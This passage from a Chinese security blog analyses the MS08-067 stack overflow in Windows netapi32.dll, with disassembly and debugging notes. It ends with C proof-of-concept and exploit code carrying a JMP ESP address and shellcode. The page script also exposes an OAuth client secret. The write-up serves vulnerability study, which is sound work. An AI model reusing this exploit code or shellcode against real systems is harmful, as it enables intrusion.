的位置，主要有两种解决方法：</p><ul><li><strong>事先定义变量记录每一个 \ 的位置</strong>；当复制结束后，当前指针 p1 的值更新为 p3， p3 的值更新为 p4；同 p3 一样， p4 也需要变量进行记录。</li><li><strong>如果不定义变量</strong>，则可以在“移经”后的路径中，从 p1 左侧开始，向左搜索首次出现的 ‘\’，即 p3；如果 p1 依然指向经典目录 ‘…\’，那么 p3 就是下一次 “移经” 复制的目的地址。</li></ul><p>RemoveLegacyFolder 函数采用的是不定义变量更新 p3，然而正是这个 “向左（前）搜索” 存在着 “风险”。</p><h2 id="静态分析"><a class="markdownIt-Anchor" href="#静态分析"></a> 静态分析</h2><p>函数调用链 <code>NetpwPathCanonicalize-&gt;CanonicalizePathName-&gt;RemoveLegacyFolder</code></p><h3 id="netpwpathcanonicalize"><a class="markdownIt-Anchor" href="#netpwpathcanonicalize"></a> NetpwPathCanonicalize</h3><p>**函数作用：**NetpwPathCanonicalize用于格式化网络路径字符串。</p><p>如果prefix串非空，将prefix串与path串用<code>\</code>相连，并复制输出到串<code>can_path</code>中，输出串的容量为maxbuf字节大小。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prefix + &#x27;\&#x27; + path =&gt; can_path [max_buf]</span><br></pre></td></tr></table></figure><p><strong>函数原型</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Int <span class="title function_">NetpwPathCanonicalize</span><span class="params">(</span></span><br><span class="line"><span class="params">    Uint16 path[ ],            <span class="comment">// [in]    path name</span></span></span><br><span class="line"><span class="params">    Uint8 can_path[ ],        <span class="comment">// [out]  canonicalized path</span></span></span><br><span class="line"><span class="params">    Uint32 maxbuf,            <span class="comment">// [in]     max size of can_path</span></span></span><br><span class="line"><span class="params">    Uint16 prefix[ ],        <span class="comment">// [in]     path prefix</span></span></span><br><span class="line"><span class="params">    Uint32* pathtype,        <span class="comment">// [int out] path type</span></span></span><br><span class="line"><span class="params">    Uint32 pathflags        <span class="comment">// [in]    path flags, 0 or 1</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>通过 NetpwPathCanonicalize 函数，找到 CanonicalizePathName 函数。<br><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/image-20220719230053057.png" alt="image-20220719230053057"></p><p>在CanonicalizePathName 中找到 RemoveLegacyFolder 函数。</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/image-20220719221744326.png" alt="image-20220719221744326"></p><h2 id="动态调试"><a class="markdownIt-Anchor" href="#动态调试"></a> 动态调试</h2><p>在调用 RemoveLegacyFolder 时，RemoveLegacyFolder 的返回地址位于 0x12F6A4；待处理的合并路径，即 Buff_OF（ 0x12F6A8）指向的 unicode 串位于稍大的栈地址 0x12F6C0，是唯一的输入参数。</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/image-20220719222947145.png" alt="image-20220719222947145"></p><p>在移去经典目录‘ …\’后， RemoveLegacyFolder 函数会向左（前）即低地址空间搜索隔离字符‘ \’，如果前向搜索越过了待处理串的起始字符，即小于 0x12F6C0，搜索的结果将不可控，很可能远小于 ESP；当合并路径中再次出现经典目录‘ …\’并需要移去时，复制操作会将路径数据写入前面搜索到的栈地址，产生溢出，如果路径数据经过精心设计，很可能使某个函数的返回地址被覆盖修改，使溢出被成功利用。</p><p>总结，成功溢出的条件：<br>1）充分条件：前向搜索隔离符时，越过了 Buff_OF 指向的待处理串。<br>2）必要条件：合并路径中至少存在两个连续的经典目录‘…\’。<br>3）必要条件：合并路径中第二个‘…\’后有足够多的字符数以覆盖返回地址。</p><h1 id="poc-的构造"><a class="markdownIt-Anchor" href="#poc-的构造"></a> POC 的构造</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(__stdcall *MYPROC)</span> <span class="params">(LPWSTR, LPWSTR, DWORD,LPWSTR, LPDWORD,DWORD)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    WCHAR path[<span class="number">256</span>];</span><br><span class="line">    WCHAR can_path[<span class="number">256</span>];</span><br><span class="line">    DWORD type = <span class="number">1000</span>;</span><br><span class="line">    <span class="type">int</span> retval;</span><br><span class="line">    HMODULE handle = LoadLibrary(<span class="string">&quot;.\\netapi32.dll&quot;</span>);</span><br><span class="line">    MYPROC Trigger = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == handle)</span><br><span class="line">    &#123;</span><br><span class="line">        wprintf(<span class="string">L&quot;Fail to load library!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Trigger = (MYPROC)GetProcAddress(handle, <span class="string">&quot;NetpwPathCanonicalize&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == Trigger)</span><br><span class="line">    &#123;</span><br><span class="line">        FreeLibrary(handle);</span><br><span class="line">        wprintf(<span class="string">L&quot;Fail to get api address!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    path[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    wcscpy(path, <span class="string">L&quot;\\aaa\\..\\..\\bbbb&quot;</span>);</span><br><span class="line">    can_path[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    type = <span class="number">1000</span>;</span><br><span class="line">    wprintf(<span class="string">L&quot;BEFORE: %s\n&quot;</span>, path);</span><br><span class="line">    retval = (Trigger)(path, can_path, <span class="number">1000</span>, <span class="literal">NULL</span>, &amp;type, <span class="number">1</span>);</span><br><span class="line">    wprintf(<span class="string">L&quot;AFTER : %s\n&quot;</span>, can_path);</span><br><span class="line">    wprintf(<span class="string">L&quot;RETVAL: %s(0x%X)\n\n&quot;</span>, retval?<span class="string">L&quot;FAIL&quot;</span>:<span class="string">L&quot;SUCCESS&quot;</span>, retval);</span><br><span class="line">    FreeLibrary(handle);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译后运行结果：<br><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/image-20220719223324355.png" alt="image-20220719223324355"></p><p>NetpwPathCanonicalize 函数正常返回，但是在输出的合并路径中，仍然存在一个经典目录 ‘ …\’，此时，我们可以结合静态分析，探究一下原因。以下是去除 ‘ …\’ 的相关汇编代码，变量 p1、 p2、p3 的定义请参看图 26.4.5。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">5FDDA2BD @@period_found:</span><br><span class="line">5FDDA2BD lea eax, [esi-2] 		; esi 为当前指针 p1，此时 p1 指向‘.’</span><br><span class="line">5FDDA2C0 cmp ebx, eax 			; ebx 始终指向最新的‘\’，即 p2</span><br><span class="line">5FDDA2C2 jnz @@period_after_nonslash</span><br><span class="line">								; 判断是否是经典目录：‘\.’或‘\..’</span><br><span class="line">5FDDA2C8 @@period_after_slash:</span><br><span class="line">5FDDA2C8 lea eax, [esi+2] 		; eax 指向下一字符</span><br><span class="line">5FDDA2CB mov dx, [eax]</span><br><span class="line">5FDDA2CE cmp dx, &#x27;.&#x27; 			; 是否‘\..’</span><br><span class="line">5FDDA2D2 jnz @@nonperiod_after_period</span><br><span class="line">5FDDA2D8 lea eax, [esi+4] 		; eax 指向下两个字符</span><br><span class="line">5FDDA2DB mov bx, [eax]</span><br><span class="line">5FDDA2DE cmp bx, &#x27;\&#x27; 			; 是否‘/../’</span><br><span class="line">5FDDA2E2 jz short @@skip_spps_by_copy</span><br><span class="line">5FDDA2E4 test bx, bx</span><br><span class="line">5FDDA2E7 jnz short @@move_forward</span><br><span class="line">5FDDA2E9 @@skip_spps_by_copy:</span><br><span class="line">5FDDA2E9 test edi, edi 			; edi 指向 p2 之前的‘\’，即 p3</span><br><span class="line">5FDDA2EB jz @@exit_fail</span><br><span class="line">5FDDA2F1 push eax</span><br><span class="line">5FDDA2F2 push edi</span><br><span class="line">5FDDA2F3 call ds:__imp_wcscpy 	; 移经操作： wcscpy(p3, p1)</span><br><span class="line">5FDDA2F9 test bx, bx</span><br><span class="line">5FDDA2FC pop ecx</span><br><span class="line">5FDDA2FD pop ecx</span><br><span class="line">5FDDA2FE jnz @@update_current_slash_after_copy</span><br><span class="line">…</span><br><span class="line">5FDE87F8 @@update_current_slash_after_copy:</span><br><span class="line">5FDE87F8 mov [ebp+current_slash], edi ; p2 &lt;= p3</span><br><span class="line">5FDE87FB mov esi, edi ; p1 &lt;= p3</span><br><span class="line">5FDE87FD lea eax, [edi-2] 		; eax &lt;= p3-2，作为向前搜索‘/’</span><br><span class="line">                                ; 的初始指针，但是这里直接将指针</span><br><span class="line">                                ; 减 2，而没有做边界检查，这是导致</span><br><span class="line">                                ; 溢出的根本原因！</span><br><span class="line">5FDE8800 jmp short @@check_previous_slash_after_copy</span><br><span class="line">5FDE8802 @@loop_search_previous_slash:</span><br><span class="line">5FDE8802 cmp eax, [ebp+arg_Path] ; 这里的边界检查已无济于事，因为</span><br><span class="line">                                ; 在 0x5FDE87FD 处 eax 已经越界！</span><br><span class="line">                                ; 注： arg_Path 就是 Buff_OF</span><br><span class="line">5FDE8805 jz short @@previous_slash_found_after_copy</span><br><span class="line">5FDE8807 dec eax</span><br><span class="line">5FDE8808 dec eax</span><br><span class="line">5FDE8809 @@check_previous_slash_after_copy:</span><br><span class="line">5FDE8809 cmp word ptr [eax], &#x27;\&#x27;</span><br><span class="line">5FDE880D jnz short @@loop_search_previous_slash</span><br><span class="line">5FDE880F @@previous_slash_found_after_copy:</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>可以看到，位于 0x5FDDA2F3 处 wcscpy 函数运行后，完成了一次“移经”操作。接着代码 0x5FDE87F8 至 0x5FDE87FD 更新相关指针。位于 0x5FDE8800 至 0x5FDE880D 的循环代码用于向前搜索隔离字符指针 p3，<strong>尽管在循环过程中，代码有做边界检查，但是在循环初始化时却没有（见 0x5FDE87FD），而直接将指针初值 EDI 减 2</strong>；一旦初始化越界，循环过程中的边界检查将失效，因为指针 EAX 永远小于 Buff_OF 的起始字符地址，而循环退出的唯一条件是在低地址空间中再次找到隔离字符‘ \’。</p><p>调试到前向搜索越界时的状态。Buff_OF 位于 0x12F6C0，但是前向搜索的指针 EAX 已经被初始化为 0x12F6BE，小于 Buff_OF 了，我们不妨称这个指针为 previous_slash。</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/image-20220719231639738.png" alt="image-20220719231639738"></p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/image-20220719232209182.png" alt="image-20220719232209182"></p><p>由于 previous_slash (=EAX) 远小于 ESP，当再次调用 wcscpy 进行字符复制时，如果复制通过精心设计， wcscpy 函数的栈帧和返回地址将被覆盖修改，也就是说当 wcscpy 退出时，溢出会被成功利用。</p><blockquote><p>提示：尽管微软在 Windows XP SP2 及之后的操作系统中引入了 security cookie 机制防止缓冲区溢出，但是 wcscpy 函数依然没有并没有采用该机制，因此 MS08-067 可以在多种操作系统上成功溢出。</p></blockquote><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/image-20220720080253266.png" alt="image-20220720080253266"></p><p>计算要覆盖到返回地址的字符长度，wcscpy 的返回地址位于 0x0012F684，prefix_slash 位于 0x0012F5A2 (EDI)。需要230个字符（0x0012F684 - 0x0012F5A2+0x4 = 0xe6）就能覆盖到返回地址了。</p><p>具备溢出功能的 POC 代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(__stdcall *MYPROC)</span> <span class="params">(LPWSTR, LPWSTR, DWORD,LPWSTR, LPDWORD,DWORD)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    WCHAR path[<span class="number">256</span>];</span><br><span class="line">    WCHAR can_path[<span class="number">256</span>];</span><br><span class="line">    DWORD type = <span class="number">1000</span>;</span><br><span class="line">    <span class="type">int</span> retval;</span><br><span class="line">    HMODULE handle = LoadLibrary(<span class="string">&quot;.\\netapi32.dll&quot;</span>);</span><br><span class="line">    MYPROC Trigger = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == handle)</span><br><span class="line">    &#123;</span><br><span class="line">        wprintf(<span class="string">L&quot;Fail to load library!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Trigger = (MYPROC)GetProcAddress(handle, <span class="string">&quot;NetpwPathCanonicalize&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == Trigger)</span><br><span class="line">    &#123;</span><br><span class="line">        FreeLibrary(handle);</span><br><span class="line">        wprintf(<span class="string">L&quot;Fail to get api address!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    path[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    wcscpy(path, <span class="string">L&quot;\\aaa\\..\\..\\bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;</span>);</span><br><span class="line">    can_path[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    type = <span class="number">1000</span>;</span><br><span class="line">    wprintf(<span class="string">L&quot;BEFORE: %s\n&quot;</span>, path);</span><br><span class="line">    retval = (Trigger)(path, can_path, <span class="number">1000</span>, <span class="literal">NULL</span>, &amp;type, <span class="number">1</span>);</span><br><span class="line">    wprintf(<span class="string">L&quot;AFTER : %s\n&quot;</span>, can_path);</span><br><span class="line">    wprintf(<span class="string">L&quot;RETVAL: %s(0x%X)\n\n&quot;</span>, retval?<span class="string">L&quot;FAIL&quot;</span>:<span class="string">L&quot;SUCCESS&quot;</span>, retval);</span><br><span class="line">    FreeLibrary(handle);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>设计出最终的 exploit代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(__stdcall *MYPROC)</span> <span class="params">(LPWSTR, LPWSTR, DWORD,LPWSTR, LPDWORD,DWORD)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// address of jmp esp</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JMP_ESP  <span class="string">&quot;\x0b\xe9\xe0\x5f\x00\x00&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//shellcode</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHELL_CODE \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;\x90\x90\x90\x90&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x00\x00&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    WCHAR path[<span class="number">256</span>];</span><br><span class="line">    WCHAR can_path[<span class="number">256</span>];</span><br><span class="line">    DWORD type = <span class="number">1000</span>;</span><br><span class="line">    <span class="type">int</span> retval;</span><br><span class="line">    HMODULE handle = LoadLibrary(<span class="string">&quot;.\\netapi32.dll&quot;</span>);</span><br><span class="line">    MYPROC Trigger = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == handle)</span><br><span class="line">    &#123;</span><br><span class="line">		wprintf(<span class="string">L&quot;Fail to load library!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Trigger = (MYPROC)GetProcAddress(handle, <span class="string">&quot;NetpwPathCanonicalize&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == Trigger)</span><br><span class="line">    &#123;</span><br><span class="line">		FreeLibrary(handle);</span><br><span class="line">		wprintf(<span class="string">L&quot;Fail to get api address!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    path[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    wcscpy(path, <span class="string">L&quot;\\aaa\\..\\..\\bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;</span>);</span><br><span class="line">    wcscat(path, (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">short</span> *)JMP_ESP);</span><br><span class="line">    wcscat(path, (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">short</span> *)SHELL_CODE);</span><br><span class="line">    can_path[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    type = <span class="number">1000</span>;</span><br><span class="line">    wprintf(<span class="string">L&quot;BEFORE: %s\n&quot;</span>, path);</span><br><span class="line">    retval = (Trigger)(path, can_path, <span class="number">1000</span>, <span class="literal">NULL</span>, &amp;type, <span class="number">1</span>);</span><br><span class="line">    wprintf(<span class="string">L&quot;AFTER : %s\n&quot;</span>, can_path);</span><br><span class="line">    wprintf(<span class="string">L&quot;RETVAL: %s(0x%X)\n\n&quot;</span>, retval?<span class="string">L&quot;FAIL&quot;</span>:<span class="string">L&quot;SUCCESS&quot;</span>, retval);</span><br><span class="line">    FreeLibrary(handle);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/image-20220720105512544-16583052120081.png" alt="image-20220720105512544" style="zoom:67%"></div><div class="article-footer"><blockquote class="mt-2x"><ul class="post-copyright list-unstyled"><li class="post-copyright-link hidden-xs"><strong>本文链接：</strong> <a href="https://www.rgzzplus.com/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/" title="RPC入侵：MS08-067" target="_blank" rel="external">https://www.rgzzplus.com/2022/07/20/RPC入侵：MS08-067/</a></li><li class="post-copyright-license"><strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！</li></ul></blockquote><div class="panel panel-default panel-badger"><div class="panel-body"><figure class="media"><div class="media-left"><a href="https://github.com/rgzz-zq" target="_blank" class="img-burn thumb-sm visible-lg"><img src="/images/avatar.jpg" class="img-rounded w-full" alt=""></a></div><div class="media-body"><h3 class="media-heading"><a href="https://github.com/rgzz-zq" target="_blank"><span class="text-dark">人工智障plus</span><small class="ml-1x"></small></a></h3><div>一只网安菜鸟。</div></div></figure></div></div></div></article><section id="comments"></section></div><nav class="bar bar-footer clearfix" data-stick-bottom><div class="bar-inner"><ul class="pager pull-left"><li class="prev"><a href="/2022/07/22/CVE-2009-0927%EF%BC%9APDF%E4%B8%AD%E7%9A%84JS/" title="CVE-2009-0927：PDF中的JS"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a></li><li class="next"><a href="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/" title="RPC入侵：MS06-040"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a></li><li class="toggle-toc"><a class="toggle-btn" data-toggle="collapse" href="#collapseToc" aria-expanded="false" title="文章目录" role="button"><span>[&nbsp;</span><span>文章目录</span> <i class="text-collapsed icon icon-anchor"></i> <i class="text-in icon icon-close"></i> <span>]</span></a></li></ul><div class="bar-right"><div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div></div></div></nav></main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter"><ul class="social-links"><li><a href="https://github.com/rgzz-zq" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li><li><a href="/atom.xml" target="_blank" title="Rss" data-toggle="tooltip" data-placement="top"><i class="icon icon-rss"></i></a></li></ul><div class="copyright">&copy; 2022 rgzzplus<div class="publishby">Theme by <a href="https://github.com/cofess" target="_blank">cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.</div></div></footer><script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script><script>window.jQuery||document.write('<script src="js/jquery.min.js"><\/script>')</script><script src="/js/plugin.min.js"></script><script src="/js/application.js"></script><script>window.INSIGHT_CONFIG={TRANSLATION:{POSTS:"文章",PAGES:"页面",CATEGORIES:"分类",TAGS:"标签",UNTITLED:"(未命名)"},ROOT_URL:"/",CONTENT_URL:"/content.json"}</script><script src="/js/insight.js"></script><link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css"><script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script><script src="//cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script><script type="text/javascript">var gitalk=new Gitalk({clientID:"57d553a3572bd138df53",clientSecret:"f68b8f839d80ce3c3f13201f2d26843d46fc1ade",repo:"rgzz-zq.github.io",owner:"rgzz-zq",admin:["rgzz-zq"],id:md5(location.pathname),distractionFreeMode:!0,language:"zh-CN",enableHotKey:"true",proxy:"https://vercel.rgzzplus.com/github_access_token"});gitalk.render("comments")</script><script src="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.3.5/dist/jquery.fancybox.min.js"></script><script>$(document).ready(function(){$("article img").not("[hidden]").not(".panel-body img").each(function(){var a,t,n=$(this),e=n.attr("alt"),r=n.parent("a");r.length<1&&(-1!=(t=(a=this.getAttribute("src")).lastIndexOf("?"))&&(a=a.substring(0,t)),r=n.wrap('<a href="'+a+'"></a>').parent("a")),r.attr("data-fancybox","images"),e&&r.attr("data-caption",e)}),$().fancybox({selector:'[data-fancybox="images"]',hash:!1,loop:!1})})</script><script defer>var _hmt=_hmt||[];!function(){var 